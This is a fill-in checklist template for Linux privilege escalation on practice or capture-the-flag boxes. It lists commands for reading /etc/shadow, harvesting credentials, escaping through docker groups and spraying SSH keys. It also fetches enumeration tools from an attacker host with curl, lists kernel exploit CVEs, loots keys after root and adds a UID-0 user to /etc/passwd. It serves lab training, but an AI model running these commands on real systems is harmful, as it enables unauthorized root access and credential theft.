# Linux Privilege Escalation — `<BOX-NAME>` as `<user>`

> **Part 1** is the always-run core (the high-EV checks that root most boxes). **Part 2** is extended checks for when Part 1 didn't yield a path. Cross-reference [Linux-Priv-Esc.md](../Linux-Priv-Esc.md) for technique detail.

---

# PART 1 — CORE (every box)

## 0. Header

| Field | Value |
|---|---|
| Box name |  |
| Foothold user |  |
| Foothold method |  |
| Kernel (`uname -a`) |  |
| Distro |  |

---

## 1. Stabilize the Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z → on host: stty raw -echo; fg
export TERM=xterm; export SHELL=bash
stty rows 50 columns 200
```
**TTY upgraded?** [ ]

---

## 2. Identity & Context

```bash
id; whoami; hostname; uname -a; cat /etc/os-release; arch
```
**Output:**
```

```
- Groups: 
- Kernel: 
- Arch (32/64): 

---

## 3. `sudo -l` — RUN FIRST, EVERY TIME

Half the boxes end here.

```bash
sudo -l
sudo -V
```
**Output:**
```

```
**Sudo version:** ``  →  CVE-2019-14287 (< 1.8.28)? [ ]  CVE-2021-3156 Baron Samedit (< 1.9.5p2)? [ ]

**GTFOBins lookup:** https://gtfobins.github.io/#+sudo

| Binary | NOPASSWD? | env_keep? | Wildcard? | GTFOBins path | Tried |
|---|---|---|---|---|---|
|  |  |  |  |  | [ ] |

---

## 4. SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```
**Output:**
```

```

**Non-standard / interesting** (cross-check GTFOBins → SUID):

| Binary | Owner | Notes |
|---|---|---|
|  | root |  |

For custom SUID binaries (`/opt`, weird names):
```bash
file <bin>; strings <bin> | head -50; ltrace <bin>
```
Look for relative-path `system()`/`exec()` calls → PATH hijack.

---

## 5. Capabilities

```bash
getcap -r / 2>/dev/null
```
**Output:**
```

```
- [ ] `cap_setuid+ep` on python/perl/ruby → instant root
- [ ] `cap_dac_read_search` → read `/etc/shadow`

---

## 6. Cron Jobs & Systemd Timers

```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
cat /etc/cron.d/* 2>/dev/null
crontab -l
systemctl list-timers --all
```
**`/etc/crontab` + `/etc/cron.d/*`:**
```

```

| Entry | Run as | Script | Script writable? | Dir writable? | Wildcard? | Relative path? |
|---|---|---|---|---|---|---|
|  | root |  | [ ] | [ ] | [ ] | [ ] |

---

## 7. /etc/passwd & /etc/shadow

```bash
ls -la /etc/passwd /etc/shadow
cat /etc/passwd | awk -F: '$3==0'
cat /etc/shadow 2>/dev/null
```
- `/etc/passwd` writable? [ ] yes → add UID-0 user (see §A1)
- `/etc/shadow` readable? [ ] yes → unshadow + crack
- UID-0 accounts besides `root`?

---

## 8. Group Memberships → Root

```bash
id; groups
```

| Group | Path | Tried |
|---|---|---|
| `sudo` / `wheel` / `admin` | `sudo -l` | [ ] |
| `docker` | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` | [ ] |
| `lxd` / `lxc` | lxd-alpine-builder → mount host / | [ ] |
| `disk` | `debugfs /dev/sda1` → `cat /etc/shadow` | [ ] |
| `adm` | read `/var/log/auth.log` for creds | [ ] |
| `shadow` | read `/etc/shadow` directly | [ ] |

---

## 9. SSH Keys & Reuse

```bash
find / -name "id_rsa*" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
ls -la /root/.ssh 2>/dev/null
cat ~/.bash_history | grep -i ssh
```
**Keys found:**
```

```
Test against every interactive user:
```bash
for u in $(awk -F: '$7!~/false|nologin/{print $1}' /etc/passwd); do ssh -o BatchMode=yes -o StrictHostKeyChecking=no -i <key> $u@127.0.0.1 id 2>/dev/null && echo "[+] $u"; done
```

---

## 10. Credentials in Files

```bash
cat ~/.bash_history /root/.bash_history 2>/dev/null
grep -RinE 'password|passwd|secret|api[_-]?key|token' /etc /opt /home /var/www 2>/dev/null | grep -v Binary | head -100
find / \( -name "wp-config.php" -o -name ".env" -o -name "config.php" -o -name "settings.php" -o -name "database.yml" \) 2>/dev/null
find / \( -name "*.bak" -o -name "*.backup" -o -name "*.old" \) 2>/dev/null | head -50
ls -la /var/mail /var/spool/mail 2>/dev/null
```
**Creds harvested:**
| User | Pass / Hash | Source | Tested via |
|---|---|---|---|
|  |  |  | `su` [ ] SSH [ ] sudo [ ] |

**Reuse pattern:** every password → `su <user>`, SSH, key passphrase, DB.

---

## 11. LinPEAS

```bash
# Kali: sudo python3 -m http.server 80
curl http://$KALI/linpeas.sh -o /tmp/lp.sh && chmod +x /tmp/lp.sh
/tmp/lp.sh -a | tee /tmp/lp.out
```

### 🔴 RED-on-YELLOW / 95% findings (drop everything)
```

```

### Sudo / SUID / Caps / Cron sections (already covered above — just confirm no surprises)
```

```

### Interesting Files (writable, ACL'd, configs, backups)
```

```

### Searching passwords / API keys
```

```

---

## 12. Attack Path → Root

**Vector:** `<e.g., sudo -l shows /usr/bin/find NOPASSWD → GTFOBins → root>`

**Commands (for report):**
```bash

```

**Got root at:** `<timestamp>`

**Proof:**
```

```

---

---

# PART 2 — EXTENDED (if Part 1 didn't yield a path)

> Work through these when stuck. Most boxes never need this section.

---

## A1. SGID Binaries

```bash
find / -perm -2000 -type f 2>/dev/null
```
```

```
Same logic as SUID — GTFOBins lookup. Less common but check.

---

## A2. Writable Files / PATH Hijack

```bash
find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | grep -v "$HOME" | head -100
echo $PATH | tr ':' '\n' | while read p; do [ -w "$p" ] && echo "WRITABLE: $p"; done
find / -type d -perm -0002 2>/dev/null | grep -v /proc | head -50
```
**Writable root-owned files of interest:**
```

```
**Writable PATH dirs:**
```

```

**PATH hijack pattern:** root-run script calls `service` (relative) — drop `/tmp/service` script, prepend `/tmp` to PATH.

---

## A3. pspy — Watch Root Processes Live

Catches sub-minute cron, transient root processes, dynamic timers.

```bash
curl http://$KALI/pspy64 -o /tmp/pspy64 && chmod +x /tmp/pspy64
/tmp/pspy64 -pf -i 1000
```
**Hits:**
```

```

---

## A4. Processes & Internal Services

```bash
ps auxf
ps aux | grep root
ss -tlnp 2>/dev/null
ss -tln | grep -E '127\.0\.0\.1|::1'           # loopback-only = often unauth
```

**Interesting root processes:**
```

```

| Port | Bind | Process | Internal-only? | Action |
|---|---|---|---|---|
|  |  |  | [ ] | SSH forward + attack |

**SSH local forward to reach internal:**
```bash
ssh -L 6379:127.0.0.1:6379 <user>@$IP
```
**Common loopback wins:** Redis (key write), MySQL (no pwd locally), internal admin web on :8080, Docker socket :2375.

---

## A5. Mounts & NFS

```bash
mount; df -h
cat /etc/fstab /etc/exports 2>/dev/null
showmount -e localhost 2>/dev/null
```
```

```
**`no_root_squash` on writable export:** mount on attacker → drop SUID-root binary → run on victim.

---

## A6. Container Check

```bash
ls -la /.dockerenv 2>/dev/null
cat /proc/1/cgroup | grep -E 'docker|lxc|kubepods'
cat /proc/self/status | grep CapEff
ls -la /var/run/docker.sock 2>/dev/null
```
- In container? [ ] privileged? [ ] docker.sock mounted? [ ] host fs mounted? [ ]

---

## A7. Kernel Exploits — LAST RESORT

Can crash the box. Confirm version match before running.

```bash
uname -a
# Kali: ./linux-exploit-suggester.sh -k <kernel>
ls -la /usr/bin/pkexec                                  # PwnKit quick check
```

| CVE | Name | Kernel range | Match? | Tried |
|---|---|---|---|---|
| CVE-2021-4034 | PwnKit (pkexec SUID) | most older Ubuntu/Debian | [ ] | [ ] |
| CVE-2022-0847 | DirtyPipe | 5.8 → 5.16.11 / 5.15.25 / 5.10.102 | [ ] | [ ] |
| CVE-2016-5195 | DirtyCow | < 4.8.3 | [ ] | [ ] |
| CVE-2021-3493 / 2023-0386 | OverlayFS | various | [ ] | [ ] |

---

## A8. Post-Root Loot

```bash
cat /etc/shadow
cat /root/.ssh/id_rsa 2>/dev/null
cat /home/*/.ssh/id_rsa 2>/dev/null
cat /home/*/.bash_history /root/.bash_history 2>/dev/null
find /etc -name "krb5.keytab" 2>/dev/null
ls -la /var/lib/sss/db/ 2>/dev/null                    # AD-joined
```
- [ ] `/etc/shadow` saved
- [ ] root SSH key saved
- [ ] proof file screenshot
- [ ] `ip a` for report network diagram

---

## A9. Writable `/etc/passwd` Path (if §7 flagged it)

```bash
openssl passwd -1 -salt hax mypass            # → $1$hax$xxx
echo 'pwn:$1$hax$xxx:0:0:root:/root:/bin/bash' >> /etc/passwd
su pwn                                         # pwd: mypass → UID 0
```

---

## A10. Rabbit Holes (for your own learning)

- 
- 
